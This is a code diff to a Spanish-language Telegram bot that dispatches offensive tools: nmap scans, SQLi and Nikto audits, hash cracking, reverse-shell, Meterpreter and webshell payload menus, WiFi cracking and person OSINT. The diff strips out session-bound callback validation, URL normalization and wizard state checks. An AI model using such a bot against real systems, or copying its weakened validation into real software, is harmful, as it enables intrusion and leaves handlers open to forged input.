@@ -3,7 +3,6 @@ import asyncio
 import ipaddress
 import logging
 import re
-import secrets
 import subprocess
 import time
 from datetime import datetime
@@ -37,59 +36,6 @@ audit_log = AuditLog()
 rate_limiter = RateLimiter()
 user_wizards = {}
 
-WIZARD_TTL_SECONDS = 30 * 60
-
-
-def _new_wizard(uid, wizard_type, chat_id, step="select_type", **state):
-    wizard = {
-        "session_id": secrets.token_hex(4),
-        "type": wizard_type,
-        "step": step,
-        "chat_id": chat_id,
-        "created_at": time.time(),
-        "target": None,
-        "data": {},
-    }
-    wizard.update(state)
-    user_wizards[uid] = wizard
-    log.info(
-        "Wizard session created: user=%s type=%s session=%s",
-        uid,
-        wizard_type,
-        wizard["session_id"],
-    )
-    return wizard
-
-
-def _is_wizard_expired(uid, now=None):
-    wizard = user_wizards.get(uid)
-    if not wizard:
-        return False
-    current_time = time.time() if now is None else now
-    if current_time - wizard.get("created_at", 0) <= WIZARD_TTL_SECONDS:
-        return False
-    user_wizards.pop(uid, None)
-    log.info("Wizard session expired: user=%s", uid)
-    return True
-
-
-def _consume_wizard(uid, session_id):
-    wizard = user_wizards.get(uid)
-    if not wizard or wizard.get("session_id") != session_id:
-        return None
-    return user_wizards.pop(uid)
-
-
-def _wizard_callback(wizard, action, value):
-    callback = (
-        f"w:{wizard['session_id']}:{wizard['type']}:{action}:{value}"
-    )
-    if len(callback.encode("utf-8")) > 64:
-        raise ValueError("Telegram callback_data exceeds 64 bytes")
-    return callback
-
-
-user_depths = {}
 MAIN_KEYBOARD = ReplyKeyboardMarkup(
     [
         [KeyboardButton("\U0001f50d Recon"), KeyboardButton("\U0001f310 Web"), KeyboardButton("\U0001f511 Crack")],
@@ -116,55 +62,49 @@ def _username(update: Update) -> str:
     return u.username or u.full_name or str(u.id)
 
 
-def _is_markdown_parse_error(exc):
-    message = str(exc).casefold()
-    return any(
-        marker in message
-        for marker in (
-            "can't parse entities",
-            "cannot parse entities",
-            "can not parse entities",
-        )
-    )
-
-
-def _is_message_not_modified(exc):
-    return "message is not modified" in str(exc).casefold()
-
-
-async def _safe_telegram_call(method, text, **kwargs):
+async def _safe_reply_text(message, text, **kwargs):
     try:
-        return await method(text, **kwargs)
+        return await message.reply_text(text, **kwargs)
     except BadRequest as exc:
-        if "parse_mode" not in kwargs or not _is_markdown_parse_error(exc):
-            log.error("Telegram BadRequest: %s", exc)
+        if "parse_mode" not in kwargs:
             raise
+        log.warning("Markdown parse failed, retrying as plain text")
         fallback = dict(kwargs)
         fallback.pop("parse_mode", None)
-        log.warning("Telegram Markdown parse failed; retrying as plain text")
-        try:
-            return await method(text, **fallback)
-        except BadRequest as fallback_exc:
-            log.error(
-                "Telegram plain-text fallback failed: %s", fallback_exc
-            )
-            raise
+        return await message.reply_text(text, **fallback)
 
 
-async def _safe_reply_text(message, text, **kwargs):
-    return await _safe_telegram_call(message.reply_text, text, **kwargs)
+def _back_cancel_keyboard(wizard_type: str):
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("\U0001f519 Atr\u00e1s", callback_data=f"back_{wizard_type}"),
+            InlineKeyboardButton("\u274c Cancelar", callback_data="cancel"),
+        ]
+    ])
 
 
-async def _safe_edit_text(message, text, **kwargs):
-    return await _safe_telegram_call(message.edit_text, text, **kwargs)
+def _menu_keyboard(options: list[tuple[str, str]], wizard_type: str):
+    buttons = []
+    for label, cb in options:
+        buttons.append(InlineKeyboardButton(label, callback_data=cb))
+    rows = [buttons[i:i+2] for i in range(0, len(buttons), 2)]
+    rows.append([
+        InlineKeyboardButton("\U0001f519 Atr\u00e1s", callback_data=f"back_{wizard_type}"),
+        InlineKeyboardButton("\u274c Cancelar", callback_data="cancel"),
+    ])
+    return InlineKeyboardMarkup(rows)
 
 
-async def _safe_edit_message(query, text, **kwargs):
-    return await _safe_telegram_call(query.edit_message_text, text, **kwargs)
+async def _back_to_menu(message):
+    await _safe_reply_text(message, "Men\u00fa principal:", reply_markup=MAIN_KEYBOARD)
+
+
+async def _return_to_menu_with_result(message, text):
+    await _safe_reply_text(message, text)
+    await _back_to_menu(message)
 
 
 # ─── Command Handlers ───
-
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -176,12 +116,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = "\U0001f3af *Artenisa v5.0 en l\u00ednea*\n\nSelecciona una operaci\u00f3n del men\u00fa:"
     if summary:
         msg += f"\n\n{summary}"
-    await _safe_reply_text(
-        update.message,
-        msg,
-        parse_mode="Markdown",
-        reply_markup=MAIN_KEYBOARD,
-    )
+    await _safe_reply_text(update.message, msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)
 
 
 async def objetivo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -199,11 +134,7 @@ async def objetivo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     target_engine.set_target(uid, target, "manual")
     audit_log.log(uid, _username(update), "/objetivo", target)
-    await _safe_reply_text(
-        update.message,
-        f"\u2705 Objetivo establecido: `{target}`",
-        parse_mode="Markdown",
-    )
+    await _safe_reply_text(update.message, f"\u2705 Objetivo establecido: `{target}`", parse_mode="Markdown")
 
 
 async def olvidar_objetivo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -229,7 +160,6 @@ async def tarea(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if "error" in status:
         await update.message.reply_text(f"\u274c {status['error']}")
         return
-
     msg = (
         f"\U0001f4cb *Tarea:* `{status['id']}`\n"
         f"\U0001f4cc Estado: `{status['status']}`\n"
@@ -237,25 +167,11 @@ async def tarea(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"\U0001f4c8 Progreso: {status['progress']}%\n"
         f"\U0001f527 Paso: {status['current_step'] or 'N/A'}"
     )
-
     result = status.get("result")
     if result and status["status"] == "completed":
         summary = result.get("summary", "")
         if summary:
             msg += f"\n\n{summary}"
-        for step in result.get("results", []):
-            if step.get("step_id") == "screenshot":
-                data = step.get("data") or {}
-                if data.get("success"):
-                    import base64
-                    img_bytes = base64.b64decode(data["screenshot_base64"])
-                    await update.message.reply_photo(
-                        photo=img_bytes,
-                        caption=f"\U0001f4f7 Screenshot: {data.get('title', status['target'])}",
-                    )
-                elif data.get("error"):
-                    msg += f"\n\u26a0\ufe0f Screenshot: {data['error']}"
-
     await _safe_reply_text(update.message, msg, parse_mode="Markdown")
 
 
@@ -273,580 +189,87 @@ async def tareas(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for t in tasks:
         icon = icons.get(t["status"], "\u2753")
         lines.append(f"{icon} `{t['id']}` {t['type']} \u2192 {t['target']} ({t['status']})")
-    await _safe_reply_text(
-        update.message, "\n".join(lines), parse_mode="Markdown"
-    )
+    await _safe_reply_text(update.message, "\n".join(lines), parse_mode="Markdown")
 
 
-async def nmap_shortcut(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    log.info("[nmap] Handler called by %s, args=%s", uid, context.args)
-    if not _check_role(uid):
-        await update.message.reply_text("\u274c No autorizado")
-        return
-    rl = _rate_limit_msg(uid)
-    if rl:
-        await update.message.reply_text(rl)
-        return
+# ─── Helper: execute a direct hacking function ───
 
-    valid_types = {"quick", "normal", "full", "vuln"}
-    target = None
-    scan_type = "normal"
-
-    args = context.args or []
-    if len(args) == 0:
-        target_info = target_engine.get_target(uid)
-        if not target_info:
-            await update.message.reply_text("\u274c No hay objetivo. Usa /objetivo <target> primero.")
-            return
-        target = target_info["target"]
-
-    elif len(args) == 1:
-        if args[0] in valid_types:
-            scan_type = args[0]
-            target_info = target_engine.get_target(uid)
-            if not target_info:
-                await update.message.reply_text("\u274c No hay objetivo. Usa /objetivo <target> primero o /nmap <scan_type> <target>")
-                return
-            target = target_info["target"]
-        else:
-            target = args[0]
-
-    else:
-        scan_type = args[0]
-        if scan_type not in valid_types:
-            await update.message.reply_text(f"scan_type debe ser uno de: {', '.join(sorted(valid_types))}")
-            return
-        target = args[1]
-
-    from tools_engine import validate_target
-    error = validate_target(target)
-    if error:
-        await update.message.reply_text(f"\u274c {error}")
-        return
-
-    task_error = None
-    try:
-        log.info("[nmap] Submitting: %s (%s)", target, scan_type)
-        task_id = task_queue.submit("nmap", target, {"scan_type": scan_type, "user_id": uid})
-        log.info("[nmap] Task ID: %s", task_id)
-        if not task_id:
-            task_error = "\u274c Error al encolar tarea"
-        else:
-            audit_log.log(
-                uid,
-                _username(update),
-                "/nmap",
-                target,
-                "ok",
-                f"task:{task_id}",
-            )
-    except Exception as exc:
-        log.error("[nmap] Exception: %s", exc, exc_info=True)
-        task_error = f"\u274c Error: {str(exc)}"
-
-    if task_error:
-        await update.message.reply_text(task_error)
-        return
-
-    msg = await _safe_reply_text(
-        update.message,
-        f"\u2705 `{task_id}` \u2014 Escaneando {target} ({scan_type})",
-        parse_mode="Markdown",
-    )
-    asyncio.create_task(_poll_nmap_task(msg, task_id))
+def _run_blocking(fn, *args, **kwargs):
+    return fn(*args, **kwargs)
 
 
-async def _poll_nmap_task(
-    msg, task_id, timeout=300, return_to_menu=False
-):
-    await asyncio.sleep(2)
-    deadline = asyncio.get_event_loop().time() + timeout
-    last_progress_text = None
-    while True:
-        status = task_queue.get_status(task_id)
-        s = status.get("status")
-        if not s:
-            error = status.get("error") or "Tarea no encontrada"
-            await _safe_edit_text(msg, f"\u274c Nmap: {error}")
-            if return_to_menu:
-                await _safe_reply_text(
-                    msg,
-                    "Menú principal:",
-                    reply_markup=MAIN_KEYBOARD,
-                )
-            return
-
-        if s == "cancelled":
-            await _safe_edit_text(msg, "\u274c Nmap: tarea cancelada")
-            if return_to_menu:
-                await _safe_reply_text(
-                    msg,
-                    "Menú principal:",
-                    reply_markup=MAIN_KEYBOARD,
-                )
-            return
-
-        if s == "completed":
-            result = status.get("result") or {}
-            target = status.get("target", "")
-            scan_type = (status.get("params") or {}).get("scan_type", "normal")
-            elapsed = result.get("elapsed", 0)
-            parsed = result.get("parsed")
-            stdout = result.get("stdout", "")
-
-            lines = [f"\u2705 *Nmap* `{target}` ({scan_type}) \u2014 {elapsed:.1f}s"]
-            if parsed:
-                hosts = parsed.get("summary", {}).get("hosts_up", 0)
-                ports = parsed.get("summary", {}).get("total_ports_found", 0)
-                if hosts:
-                    lines.append(f"Hosts: {hosts} | Puertos: {ports}")
-                for host in parsed.get("hosts", [])[:3]:
-                    ip = host.get("ip", "")
-                    hn = host.get("hostname", "")
-                    name = f" ({hn})" if hn else ""
-                    lines.append(f"\n`{ip}`{name}")
-                    for p in host.get("ports", [])[:10]:
-                        svc = f" - {p['service']}" if p.get("service") else ""
-                        lines.append(f"  \U0001f4e1 {p['port']}/{p['protocol']} {p['state']}{svc}")
-            else:
-                out = stdout[:1500] if stdout else "(sin salida)"
-                lines.append(f"\n```\n{out}\n```")
-            await _safe_edit_text(
-                msg, "\n".join(lines), parse_mode="Markdown"
-            )
-            if return_to_menu:
-                await _safe_reply_text(
-                    msg,
-                    "Men\u00fa principal:",
-                    reply_markup=MAIN_KEYBOARD,
-                )
-            return
-
-        elif s == "failed":
-            error = status.get("error", "Error desconocido")
-            await _safe_edit_text(msg, f"\u274c Nmap fall\u00f3: {error}")
-            if return_to_menu:
-                await _safe_reply_text(
-                    msg,
-                    "Men\u00fa principal:",
-                    reply_markup=MAIN_KEYBOARD,
-                )
-            return
-
-        elif s == "running":
-            pct = status.get("progress", 0)
-            filled = max(0, min(10, int(pct) // 10))
-            bar = "\u2588" * filled + "\u2591" * (10 - filled)
-            step = status.get("current_step") or "Procesando..."
-            progress_text = (
-                f"\u23f3 `{task_id}` \u2014 [{bar}] {pct}%\n"
-                f"\U0001f527 {step}"
-            )
-            if progress_text != last_progress_text:
-                try:
-                    await _safe_edit_text(
-                        msg,
-                        progress_text,
-                        parse_mode="Markdown",
-                    )
-                except BadRequest as exc:
-                    if not _is_message_not_modified(exc):
-                        raise
-                    log.debug(
-                        "Nmap progress was already current: task=%s",
-                        task_id,
-                    )
-                last_progress_text = progress_text
-
-        if asyncio.get_event_loop().time() > deadline:
-            await _safe_edit_text(
-                msg,
-                f"\u23f0 `{task_id}` \u2014 Tiempo agotado ({timeout}s)",
-            )
-            if return_to_menu:
-                await _safe_reply_text(
-                    msg,
-                    "Men\u00fa principal:",
-                    reply_markup=MAIN_KEYBOARD,
-                )
-            return
-
-        await asyncio.sleep(2)
+async def _run_crack(hash_value: str, wordlist=None) -> dict:
+    if wordlist:
+        return hacking.crypto.hash_crack(hash_value, wordlist)
+    return hacking.crypto.hash_crack(hash_value)
 
 
-async def _poll_playbook_task(
-    msg, task_id, label, timeout=600, return_to_menu=False, uid=None
-):
-    await asyncio.sleep(2)
-    deadline = asyncio.get_event_loop().time() + timeout
-    last_progress_text = None
-
-    async def finish(text):
-        await _safe_edit_text(msg, text)
-        if return_to_menu:
-            await _safe_reply_text(
-                msg,
-                "Menú principal:",
-                reply_markup=MAIN_KEYBOARD,
-            )
-
-    while True:
-        status = task_queue.get_status(task_id)
-        state = status.get("status")
-
-        if not state:
-            error = status.get("error") or "Tarea no encontrada"
-            await finish(f"{label}: {error}")
-            return
-
-        if state == "cancelled":
-            await finish(f"{label}: tarea cancelada")
-            return
-
-        if state == "completed":
-            result = status.get("result") or {}
-            target = status.get("target") or result.get("target") or ""
-
-            def clip(value, limit):
-                text = str(value)
-                if len(text) <= limit:
-                    return text
-                return text[:limit - 3] + "..."
-
-            lines = [
-                f"{clip(label, 120)} completado",
-                f"Objetivo: {clip(target, 500)}",
-            ]
-            summary = result.get("summary")
-            if summary:
-                lines.extend(("", clip(summary, 500)))
-            results = result.get("results") or []
-            if results:
-                lines.extend(("", "Resultados:"))
-                for step_result in results:
-                    step_status = (
-                        "OK" if step_result.get("success") else "SKIP"
-                    )
-                    step_label = clip(
-                        step_result.get("label") or "", 120
-                    )
-                    step_line = f"[{step_status}] {step_label}"
-                    note = step_result.get("note")
-                    if note:
-                        step_line += f" - {clip(note, 80)}"
-                    lines.append(step_line)
-            completion = "\n".join(lines)
-            if len(completion) > 3500:
-                completion = completion[:3497] + "..."
-            if uid:
-                ok_count = sum(1 for r in results if r.get("success"))
-                audit_status = "ok" if ok_count == len(results) else "partial"
-                params = status.get("params") or {}
-                task_target = status.get("target") or ""
-                audit_log.log(
-                    uid,
-                    str(uid),
-                    "wizard:osint",
-                    task_target,
-                    audit_status,
-                    f"task:{task_id} ok:{ok_count}/{len(results)}",
-                )
-            await finish(completion)
-            return
-
-        if state == "failed":
-            error = status.get("error") or "Error desconocido"
-            if uid:
-                task_target = status.get("target") or ""
-                audit_log.log(
-                    uid,
-                    str(uid),
-                    "wizard:osint",
-                    task_target,
-                    "error",
-                    f"task:{task_id} error:{error}",
-                )
-            await finish(f"{label} falló: {error}")
-            return
-
-        if state in {"queued", "running"}:
-            pct = status.get("progress", 0)
-            filled = max(0, min(10, int(pct) // 10))
-            bar = "\u2588" * filled + "\u2591" * (10 - filled)
-            step = status.get("current_step") or "Sin paso reportado"
-            progress_text = (
-                f"\u23f3 `{task_id}` \u2014 [{bar}] {pct}%\n"
-                f"\U0001f527 {step}"
-            )
-            if progress_text != last_progress_text:
-                try:
-                    await _safe_edit_text(
-                        msg,
-                        progress_text,
-                        parse_mode="Markdown",
-                    )
-                except BadRequest as exc:
-                    if not _is_message_not_modified(exc):
-                        raise
-                    log.debug(
-                        "Playbook progress was already current: task=%s",
-                        task_id,
-                    )
-                last_progress_text = progress_text
-
-        if asyncio.get_event_loop().time() > deadline:
-            await finish(
-                f"\u23f0 `{task_id}` \u2014 Tiempo agotado ({timeout}s)"
-            )
-            return
-
-        await asyncio.sleep(2)
-
-
-# ─── Wizard Keyboards ───
-
-
-def _wizard_keyboard(
-    wizard: dict, options: list[tuple[str, str, str]]
-):
-    buttons = [
-        InlineKeyboardButton(
-            label,
-            callback_data=_wizard_callback(wizard, action, value),
-        )
-        for label, action, value in options
-    ]
-    rows = [
-        buttons[index:index + 2]
-        for index in range(0, len(buttons), 2)
-    ]
-    rows.append(
-        [
-            InlineKeyboardButton(
-                "\U0001f519 Atr\u00e1s",
-                callback_data=_wizard_callback(wizard, "back", "main"),
-            ),
-            InlineKeyboardButton(
-                "\u274c Cancelar",
-                callback_data=_wizard_callback(wizard, "cancel", "now"),
-            ),
-        ]
-    )
-    return InlineKeyboardMarkup(rows)
-
-
-_CALLBACK_RULES = {
-    ("recon", "select_type", "type"): {"quick", "normal", "full"},
-    ("web", "select_type", "type"): {"recon", "vuln"},
-    ("crack", "select_type", "type"): {"hash"},
-    ("crack", "select_dict", "method"): {"integrated", "custom"},
-    ("payload", "select_type", "type"): {"reverse", "webshell"},
-    ("payload", "select_lang", "lang"): {"bash", "php"},
-    ("red", "select_type", "type"): {"quick", "normal", "full"},
-    ("osint", "select_type", "type"): {"email", "domain"},
-}
-
-
-_EXPIRED_CALLBACK_ALERT = (
-    "Este boton ya expiro. Abre un nuevo wizard desde el menu."
-)
-
-
-def _validate_wizard_callback(
-    uid: int, chat_id: int, data: str
-) -> tuple[
-    dict | None,
-    str | None,
-    str | None,
-    tuple[str, str] | None,
-]:
-    if not _check_role(uid):
-        return None, None, None, ("unauthorized", "No autorizado")
-    rate_limit_error = _rate_limit_msg(uid)
-    if rate_limit_error:
-        return None, None, None, ("rate_limited", rate_limit_error)
-    if not isinstance(data, str) or len(data.encode("utf-8")) > 64:
-        return None, None, None, ("malformed_data", _EXPIRED_CALLBACK_ALERT)
-    parts = data.split(":")
-    if (
-        len(parts) != 5
-        or parts[0] != "w"
-        or not re.fullmatch(r"[0-9a-f]{8}", parts[1])
-    ):
-        return None, None, None, ("malformed_data", _EXPIRED_CALLBACK_ALERT)
-    _, session_id, wizard_type, action, value = parts
-    if _is_wizard_expired(uid):
-        return None, None, None, ("expired_session", _EXPIRED_CALLBACK_ALERT)
-    wizard = user_wizards.get(uid)
-    if not wizard:
-        return None, None, None, ("no_session", _EXPIRED_CALLBACK_ALERT)
-    if wizard.get("session_id") != session_id:
-        return None, None, None, ("session_mismatch", _EXPIRED_CALLBACK_ALERT)
-    if wizard.get("type") != wizard_type:
-        return None, None, None, (
-            "wizard_type_mismatch",
-            _EXPIRED_CALLBACK_ALERT,
-        )
-    if wizard.get("chat_id") != chat_id:
-        return None, None, None, ("chat_mismatch", _EXPIRED_CALLBACK_ALERT)
-    if action == "back" and value == "main":
-        return wizard, action, value, None
-    if action == "cancel" and value == "now":
-        return wizard, action, value, None
-    allowed = _CALLBACK_RULES.get(
-        (wizard_type, wizard.get("step"), action)
-    )
-    if not allowed or value not in allowed:
-        return None, None, None, ("invalid_selection", _EXPIRED_CALLBACK_ALERT)
-    if wizard_type == "payload" and action == "lang":
-        language_sets = {
-            "reverse": {"bash", "python", "php", "powershell"},
-            "webshell": {"php", "asp", "aspx", "jsp", "py"},
-        }
-        if value not in language_sets.get(
-            wizard.get("payload_type"), set()
-        ):
-            return None, None, None, (
-                "invalid_payload_language",
-                _EXPIRED_CALLBACK_ALERT,
-            )
-    return wizard, action, value, None
-
-
-async def _reject_callback(
-    query, reason, message, uid=None, chat_id=None
-):
-    log.warning(
-        "Telegram callback rejected: reason=%s user=%s chat=%s data=%r",
-        reason,
-        uid,
-        chat_id,
-        getattr(query, "data", None),
-    )
-    try:
-        await query.answer(message, show_alert=True)
-    except Exception:
-        log.warning(
-            "Could not answer rejected Telegram callback", exc_info=True
-        )
-
-
-async def _send_expired_callback(query):
-    await _reject_callback(
-        query, "session_unavailable", _EXPIRED_CALLBACK_ALERT
-    )
-
-
-# ─── Recon Wizard ───
-
+# ─── Wizard Starters ───
 
 async def _start_recon_wizard(update, uid):
-    wizard = _new_wizard(uid, "recon", update.effective_chat.id)
-    keyboard = _wizard_keyboard(wizard, [
-        ("\u26a1 Quick", "type", "quick"),
-        ("\U0001f50e Normal", "type", "normal"),
-        ("\U0001f9e0 Full", "type", "full"),
-    ])
+    user_wizards[uid] = {"type": "recon", "step": "select_type", "data": {}}
+    keyboard = _menu_keyboard([
+        ("\u26a1 Quick", "recon_quick"),
+        ("\U0001f50e Normal", "recon_normal"),
+        ("\U0001f9e0 Full", "recon_full"),
+    ], "recon")
     await update.message.reply_text("\U0001f50d *Recon* \u2014 \u00bfTipo de escaneo?", parse_mode="Markdown", reply_markup=keyboard)
 
 
-async def _handle_recon_type(query, uid, wizard, subtype):
-    if subtype not in {"quick", "normal", "full"}:
-        await query.edit_message_text("Tipo de escaneo no permitido.")
-        return
-    updates = dict(
-        step="awaiting_target",
-        scan_type=subtype,
-        target=None,
-    )
-    await query.edit_message_text("Introduce la IP, dominio o rango:")
-    wizard.update(updates)
-
-
-# ─── Web Wizard ───
-
-
-_EXPLICIT_SCHEME_RE = re.compile(
-    r"^([A-Za-z][A-Za-z0-9+.-]*):(?![0-9]+(?:[/?#]|$))"
-)
-
-
-def _normalize_web_input(value: str) -> tuple[str | None, str | None, str | None]:
-    raw = value.strip()
-    if not raw:
-        return None, None, "La URL no puede estar vacia."
-    if len(raw) > 2048:
-        return None, None, "La URL supera el limite de 2048 caracteres."
-    if "\\" in raw:
-        return None, None, "La URL no puede contener barras invertidas."
-    if any(
-        char.isspace() or ord(char) < 32 or 0x7F <= ord(char) <= 0x9F
-        for char in raw
-    ):
-        return None, None, "La URL no puede contener espacios o controles."
-
-    scheme_match = _EXPLICIT_SCHEME_RE.match(raw)
-    if scheme_match:
-        supplied_scheme = scheme_match.group(1).lower()
-        if supplied_scheme not in ("http", "https"):
-            return None, None, "Solo se permiten URLs HTTP o HTTPS."
-    else:
-        raw = "https://" + raw
-
-    try:
-        parsed = urlparse(raw)
-        scheme = parsed.scheme.lower()
-        hostname = parsed.hostname
-        parsed.port
-    except ValueError:
-        return None, None, "La URL esta malformada."
-
-    if scheme not in ("http", "https") or not hostname:
-        return None, None, "La URL debe incluir un hostname valido."
-    if parsed.username is not None or parsed.password is not None:
-        return None, None, "La URL no puede incluir credenciales."
-
-    normalized = parsed._replace(scheme=scheme).geturl()
-    from tools_engine import validate_target, validate_url_target
-
-    error = validate_url_target(normalized)
-    if error:
-        return None, None, error
-    error = validate_target(hostname)
-    if error:
-        return None, None, error
-    return normalized, hostname, None
-
-
 async def _start_web_wizard(update, uid):
-    wizard = _new_wizard(uid, "web", update.effective_chat.id)
-    keyboard = _wizard_keyboard(wizard, [
-        ("\U0001f50e Reconocimiento Web", "type", "recon"),
-        ("\U0001f6e1\ufe0f Auditoría de Vulnerabilidades", "type", "vuln"),
-    ])
+    user_wizards[uid] = {"type": "web", "step": "select_type", "data": {}}
+    keyboard = _menu_keyboard([
+        ("\U0001f9f0 Nikto", "web_nikto"),
+        ("\U0001f50d SQLi", "web_sqli"),
+        ("\U0001f512 SSL Check", "web_ssl"),
+        ("\U0001f577\ufe0f Crawler", "web_crawler"),
+    ], "web")
     await update.message.reply_text("\U0001f310 *Web* \u2014 \u00bfTipo de auditor\u00eda?", parse_mode="Markdown", reply_markup=keyboard)
 
 
-async def _handle_web_type(query, uid, wizard, subtype):
-    if subtype not in {"recon", "vuln"}:
-        await query.edit_message_text("Tipo de auditoria no permitido.")
-        return
-    updates = dict(
-        step="awaiting_target",
-        audit_type=subtype,
-        target=None,
-    )
-    await query.edit_message_text("Introduce una URL HTTP(S) del sitio web:")
-    wizard.update(updates)
+async def _start_crack_wizard(update, uid):
+    user_wizards[uid] = {"type": "crack", "step": "select_type", "data": {}}
+    keyboard = _menu_keyboard([
+        ("\U0001f511 Hash", "crack_hash"),
+    ], "crack")
+    await update.message.reply_text("\U0001f511 *Crack* \u2014 \u00bfTipo?", parse_mode="Markdown", reply_markup=keyboard)
 
 
-# ─── Crack Wizard ───
+async def _start_payload_wizard(update, uid):
+    user_wizards[uid] = {"type": "payload", "step": "select_type", "data": {}}
+    keyboard = _menu_keyboard([
+        ("\U0001f41a Reverse Shell", "payload_reverse"),
+        ("\U0001f916 Meterpreter", "payload_meterpreter"),
+        ("\U0001f4bb Webshell", "payload_webshell"),
+    ], "payload")
+    await update.message.reply_text("\U0001f4a3 *Payload* \u2014 \u00bfTipo?", parse_mode="Markdown", reply_markup=keyboard)
 
 
-SUPPORTED_HASH_ALGORITHMS = frozenset(
-    {"MD5", "SHA1", "SHA224", "SHA256", "SHA384", "SHA512"}
-)
+async def _start_red_wizard(update, uid):
+    user_wizards[uid] = {"type": "red", "step": "select_type", "data": {}}
+    keyboard = _menu_keyboard([
+        ("\U0001f4f6 Escanear WiFi", "red_wifi_scan"),
+        ("\U0001f511 Crackear WiFi", "red_wifi_crack"),
+        ("\U0001f4e1 Escanear LAN", "red_lan_scan"),
+    ], "red")
+    await update.message.reply_text("\U0001f4e1 *Red* \u2014 \u00bfTipo de operaci\u00f3n?", parse_mode="Markdown", reply_markup=keyboard)
+
+
+async def _start_osint_wizard(update, uid):
+    user_wizards[uid] = {"type": "osint", "step": "select_type", "data": {}}
+    keyboard = _menu_keyboard([
+        ("\U0001f4e7 Email", "osint_email"),
+        ("\U0001f310 Dominio", "osint_domain"),
+        ("\U0001f9d1 Persona", "osint_person"),
+    ], "osint")
+    await update.message.reply_text("\U0001f50e *OSINT* \u2014 \u00bfTipo?", parse_mode="Markdown", reply_markup=keyboard)
+
+
+# ─── Inline Keyboard Selection Handling ───
+# After user clicks an option in the menu, handle_callback routes here.
+# These functions ask for target data or execute directly.
+
+SUPPORTED_HASH_ALGORITHMS = frozenset({"MD5", "SHA1", "SHA224", "SHA256", "SHA384", "SHA512"})
 
 
 def _validate_hash_algorithm(value: str) -> tuple[str | None, str | None]:
@@ -855,416 +278,369 @@ def _validate_hash_algorithm(value: str) -> tuple[str | None, str | None]:
         algorithm = candidate.get("type", "")
         if algorithm in SUPPORTED_HASH_ALGORITHMS:
             return algorithm, None
-    detected = ", ".join(
-        candidate.get("type", "desconocido") for candidate in candidates
-    )
-    return None, (
-        f"Algoritmo no soportado: {detected}. "
-        "Usa MD5 o SHA1/224/256/384/512."
-    )
+    detected = ", ".join(candidate.get("type", "desconocido") for candidate in candidates)
+    return None, f"Algoritmo no soportado: {detected}. Usa MD5 o SHA1/224/256/384/512."
 
 
-async def _start_crack_wizard(update, uid):
-    wizard = _new_wizard(uid, "crack", update.effective_chat.id)
-    keyboard = _wizard_keyboard(wizard, [
-        ("\U0001f511 Hash", "type", "hash"),
-    ])
-    await update.message.reply_text("\U0001f511 *Crack* \u2014 \u00bfTipo?", parse_mode="Markdown", reply_markup=keyboard)
-
-
-async def _handle_crack_type(query, uid, wizard, subtype):
-    if subtype != "hash":
-        await query.edit_message_text("Tipo de crack no permitido.")
-        return
-    if (
-        user_wizards.get(uid) is not wizard
-        or wizard.get("type") != "crack"
-        or wizard.get("step") != "select_type"
-    ):
-        await query.edit_message_text("Este wizard expiro. Vuelve al menu.")
-        return
-    updates = dict(
-        step="awaiting_value",
-        crack_type="hash",
-        target=None,
-    )
+async def _handle_crack_hash(query, uid):
+    user_wizards[uid].update(step="awaiting_hash", data={})
     await query.edit_message_text("Pega el hash:")
-    wizard.update(updates)
 
 
-async def _handle_crack_value(query, uid, value):
-    wizard = user_wizards.get(uid)
-    if (
-        not wizard
-        or wizard.get("type") != "crack"
-        or wizard.get("step") != "awaiting_value"
-        or wizard.get("crack_type") != "hash"
-    ):
-        await query.edit_message_text("Metodo de crack no permitido.")
-        return
-    algorithm, error = _validate_hash_algorithm(value)
+async def _execute_crack_now(query, uid, hash_value, method="integrated", wordlist=None):
+    algorithm, error = _validate_hash_algorithm(hash_value)
     if error:
-        await _safe_edit_message(query, error)
+        await _safe_reply_text(query.message, error)
         return
-    updates = dict(
-        target=value.strip(),
-        algorithm=algorithm,
-        step="select_dict",
-    )
-    keyboard = _wizard_keyboard(wizard, [
-        ("\U0001f4da Integrado", "method", "integrated"),
-        ("\U0001f3b2 Custom", "method", "custom"),
-    ])
-    await query.edit_message_text("\U0001f511 \u00bfDiccionario?", reply_markup=keyboard)
-    wizard.update(updates)
-
-
-async def _execute_crack(
-    query,
-    uid,
-    wizard,
-    method,
-    wordlist=None,
-    consumed_wizard=None,
-):
-    if wizard.get("crack_type") != "hash" or method not in (
-        "integrated",
-        "custom",
-    ):
-        await query.edit_message_text("Metodo de crack no permitido.")
-        return
-    algorithm, error = _validate_hash_algorithm(wizard.get("target", ""))
-    if error:
-        await _safe_edit_message(query, error)
-        return
-    consumed = consumed_wizard or _consume_wizard(
-        uid, wizard.get("session_id", "")
-    )
-    if not consumed:
-        await _send_expired_callback(query)
-        return
-
-    hash_value = consumed["target"]
-    await _safe_edit_message(query, "\u23f3 Analizando hash...")
+    await query.edit_message_text("\u23f3 Analizando hash...")
     try:
-        if wordlist is None:
-            result = hacking.crypto.hash_crack(hash_value)
-        else:
-            result = hacking.crypto.hash_crack(hash_value, wordlist)
+        result = await asyncio.to_thread(hacking.crypto.hash_crack, hash_value, wordlist)
     except Exception as exc:
         log.exception("Crack wizard failed")
-        audit_log.log(
-            uid,
-            str(uid),
-            "wizard:crack",
-            hash_value,
-            "error",
-            str(exc),
-        )
-        await _safe_edit_message(
-            query,
-            "No se pudo completar Crack. Abre un nuevo wizard desde el menu.",
-        )
-        await _safe_reply_text(
-            query.message,
-            "Menú principal:",
-            reply_markup=MAIN_KEYBOARD,
-        )
+        audit_log.log(uid, str(uid), "wizard:crack", hash_value, "error", str(exc))
+        await query.edit_message_text("No se pudo completar Crack.")
+        await _back_to_menu(query.message)
         return
     status = "ok" if result.get("cracked") else "fail"
-    audit_log.log(
-        uid, str(uid), "wizard:crack", hash_value, status, method
-    )
-    message = _format_crack(result, method)
-    await _safe_edit_message(query, message, parse_mode="Markdown")
-    await _safe_reply_text(
-        query.message,
-        "Menú principal:",
-        reply_markup=MAIN_KEYBOARD,
-    )
